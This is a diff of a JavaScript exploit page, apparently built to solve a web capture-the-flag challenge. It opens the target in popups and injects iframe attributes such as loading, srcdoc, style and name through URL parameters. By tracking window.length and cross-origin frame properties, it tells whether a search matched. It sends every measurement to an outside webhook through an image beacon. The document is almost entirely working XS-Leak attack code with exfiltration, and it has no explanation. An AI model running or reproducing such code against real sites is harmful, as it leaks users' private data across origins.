@@ -10,15 +10,14 @@ function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
 function log(m) { document.getElementById('log').textContent += m + '\n'; }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-// Track popup.length over time (every intervalMs for durationMs)
-function trackPopup(url, durationMs, intervalMs) {
+// Track popup.length every intervalMs for durationMs
+function trackPopup(url, durationMs, intervalMs, features) {
   return new Promise(function(resolve) {
     var w;
-    try { w = window.open(url); } catch(e) {
-      resolve({ history: [-1], err: e.message }); return;
+    try { w = window.open(url, '', features || ''); } catch(e) {
+      resolve({ history: [-1] }); return;
     }
-    if (!w) { resolve({ history: [-2], err: 'blocked' }); return; }
-
+    if (!w) { resolve({ history: [-2] }); return; }
     var history = [];
     var start = performance.now();
     var iv = setInterval(function() {
@@ -34,105 +33,113 @@ function trackPopup(url, durationMs, intervalMs) {
   });
 }
 
-// Open popup, wait delayMs, read length, close
-function delayedPopup(url, delayMs) {
-  return new Promise(function(resolve) {
-    var w;
-    try { w = window.open(url); } catch(e) {
-      resolve({ len: -1 }); return;
-    }
-    if (!w) { resolve({ len: -2 }); return; }
-    setTimeout(function() {
-      var len = -1;
-      try { len = w.length; } catch(e) {}
-      w.close();
-      resolve({ len: len });
-    }, delayMs);
-  });
-}
-
 async function run() {
-  ping('v11_start');
-  var mUrl = CHALL + '/?referrerPolicy=no-referrer';
-  var nmUrl = CHALL + '/?referrerPolicy=no-referrer&search=zzzzzzz';
+  ping('v12_start');
 
-  // === T1: Track popup.length every 100ms for 3s - MATCH ===
-  log('T1: track match');
-  var t1 = await trackPopup(mUrl, 3000, 100);
+  // === T1: loading=lazy MATCH - normal popup ===
+  log('T1: lazy match');
+  var t1 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy', 3000, 100);
   ping('t1=' + t1.history.join(','));
   await sleep(300);
 
-  // === T2: Track popup.length every 100ms for 3s - NOMATCH ===
-  log('T2: track nomatch');
-  var t2 = await trackPopup(nmUrl, 3000, 100);
+  // === T2: loading=lazy NOMATCH - normal popup ===
+  log('T2: lazy nomatch');
+  var t2 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 3000, 100);
   ping('t2=' + t2.history.join(','));
   await sleep(300);
 
-  // === T3: Track hidden match (id=hash-ad-frame) ===
-  log('T3: track hidden match');
-  var t3 = await trackPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame', 3000, 100);
+  // === T3: loading=lazy MATCH - small popup ===
+  log('T3: lazy small match');
+  var t3 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy', 3000, 100, 'width=50,height=50');
   ping('t3=' + t3.history.join(','));
   await sleep(300);
 
-  // === T4: Track hidden nomatch ===
-  log('T4: track hidden nomatch');
-  var t4 = await trackPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz', 3000, 100);
+  // === T4: loading=lazy NOMATCH - small popup ===
+  log('T4: lazy small nomatch');
+  var t4 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 3000, 100, 'width=50,height=50');
   ping('t4=' + t4.history.join(','));
   await sleep(300);
 
-  // === T5: Delayed 2s checks - basic (5x match, 5x nomatch) ===
-  log('T5: delayed basic');
-  var m5 = [], nm5 = [];
-  for (var i = 0; i < 5; i++) {
-    var r1 = await delayedPopup(mUrl, 2000);
-    m5.push(r1.len);
-    await sleep(100);
-    var r2 = await delayedPopup(nmUrl, 2000);
-    nm5.push(r2.len);
-    await sleep(100);
-  }
-  ping('t5m=' + m5.join(',') + '_nm=' + nm5.join(','));
+  // === T5: Cross-origin child frame access test ===
+  log('T5: child frame access');
+  var w5 = window.open(CHALL + '/?referrerPolicy=no-referrer');
+  await sleep(2000);
+  var t5 = {};
+  try { t5.len = w5.length; } catch(e) { t5.len = 'E'; }
+  // Try accessing child frames
+  try { t5.f0len = w5[0].length; } catch(e) { t5.f0len = 'E:' + e.message.substring(0, 40); }
+  try { t5.f0closed = w5[0].closed; } catch(e) { t5.f0closed = 'E'; }
+  // Try to see if we can distinguish frame types by accessing properties
+  try { t5.f0name = w5[0].name; } catch(e) { t5.f0name = 'E'; }
+  try { t5.f0loc = '' + w5[0].location; } catch(e) { t5.f0loc = 'E'; }
+  w5.close();
+  ping('t5=' + JSON.stringify(t5));
+  await sleep(300);
 
-  // === T6: Delayed 2s checks - hidden (5x) ===
-  log('T6: delayed hidden');
-  var m6 = [], nm6 = [];
-  for (var i = 0; i < 5; i++) {
-    var r3 = await delayedPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame', 2000);
-    m6.push(r3.len);
-    await sleep(100);
-    var r4 = await delayedPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz', 2000);
-    nm6.push(r4.len);
-    await sleep(100);
-  }
-  ping('t6m=' + m6.join(',') + '_nm=' + nm6.join(','));
+  // === T6: Named frame test (inject name on ad iframes) ===
+  log('T6: named frames');
+  var w6 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
+  await sleep(2000);
+  var t6 = {};
+  try { t6.len = w6.length; } catch(e) { t6.len = 'E'; }
+  // Try accessing named frame
+  try { var ref = w6['adf']; t6.named = ref ? 'yes' : 'no'; } catch(e) { t6.named = 'E:' + e.message.substring(0, 30); }
+  // Try accessing by numeric index and comparing
+  try { t6.f0eq = (w6[0] === w6['adf']) ? 'yes' : 'no'; } catch(e) { t6.f0eq = 'E'; }
+  w6.close();
+  ping('t6=' + JSON.stringify(t6));
+  await sleep(300);
 
-  // === T7: Delayed 2s checks - lazy (5x) ===
-  log('T7: delayed lazy');
-  var m7 = [], nm7 = [];
-  for (var i = 0; i < 5; i++) {
-    var r5 = await delayedPopup(CHALL + '/?loading=x&referrerPolicy=lazy', 2000);
-    m7.push(r5.len);
-    await sleep(100);
-    var r6 = await delayedPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 2000);
-    nm7.push(r6.len);
-    await sleep(100);
+  // === T7: Named frame with match - can we find unnamed (note) frames? ===
+  log('T7: named + match');
+  var w7 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
+  await sleep(2000);
+  var t7 = {};
+  try { t7.len = w7.length; } catch(e) { t7.len = 'E'; }
+  // Check each frame: is it the named one?
+  var frameInfo = [];
+  for (var i = 0; i < 12; i++) {
+    try {
+      var f = w7[i];
+      if (!f) { frameInfo.push('null'); continue; }
+      var isNamed = false;
+      try { isNamed = (f === w7['adf']); } catch(e2) {}
+      var subLen = -1;
+      try { subLen = f.length; } catch(e2) {}
+      frameInfo.push(i + ':' + (isNamed ? 'N' : 'U') + ':' + subLen);
+    } catch(e) {
+      frameInfo.push(i + ':E');
+    }
   }
-  ping('t7m=' + m7.join(',') + '_nm=' + nm7.join(','));
+  w7.close();
+  ping('t7=' + t7.len + '_' + frameInfo.join(','));
+  await sleep(300);
 
-  // === T8: Delayed 2s checks - srcdoc override (5x) ===
-  log('T8: delayed srcdoc');
-  var m8 = [], nm8 = [];
-  for (var i = 0; i < 5; i++) {
-    var r7 = await delayedPopup(CHALL + '/?srcdoc=x&referrerPolicy=x', 2000);
-    m8.push(r7.len);
-    await sleep(100);
-    var r8 = await delayedPopup(CHALL + '/?srcdoc=x&referrerPolicy=x&search=zzzzzzz', 2000);
-    nm8.push(r8.len);
-    await sleep(100);
-  }
-  ping('t8m=' + m8.join(',') + '_nm=' + nm8.join(','));
+  // === T8: srcdoc injection match ===
+  log('T8: srcdoc match');
+  var t8 = await trackPopup(CHALL + '/?srcdoc=x&referrerPolicy=hello', 3000, 100);
+  ping('t8=' + t8.history.join(','));
+  await sleep(300);
 
-  ping('v11_done');
+  // === T9: srcdoc injection nomatch ===
+  log('T9: srcdoc nomatch');
+  var t9 = await trackPopup(CHALL + '/?srcdoc=x&referrerPolicy=hello&search=zzzzzzz', 3000, 100);
+  ping('t9=' + t9.history.join(','));
+  await sleep(300);
+
+  // === T10: loading=lazy + id=hash-ad-frame combo (use style for display:none + lazy) ===
+  // We can only inject one attr, so test style with visibility:hidden
+  log('T10: style hidden match');
+  var t10 = await trackPopup(CHALL + '/?style=x&referrerPolicy=display:none', 3000, 100);
+  ping('t10=' + t10.history.join(','));
+  await sleep(300);
+
+  // === T11: style hidden nomatch ===
+  log('T11: style hidden nomatch');
+  var t11 = await trackPopup(CHALL + '/?style=x&referrerPolicy=display:none&search=zzzzzzz', 3000, 100);
+  ping('t11=' + t11.history.join(','));
+
+  ping('v12_done');
   log('Done!');
 }
 run();
